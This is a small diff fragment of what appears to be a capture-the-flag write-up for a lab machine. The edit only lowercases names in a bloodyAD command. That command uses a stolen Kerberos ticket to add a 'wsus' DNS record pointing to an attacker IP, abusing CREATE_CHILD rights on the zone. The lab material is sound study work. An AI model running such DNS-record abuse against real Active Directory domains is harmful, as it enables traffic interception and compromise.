@@ -35,7 +35,7 @@ The CREATE_CHILD permission over the DNS zone allows new DNS records to be creat
 2. Create new DNS Record
 
 ```
-KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host DC01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.14.57
+KRB5CCNAME=jaylee.clifton.ccache bloodyad --host dc01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.14.57
 ```
 
 or with
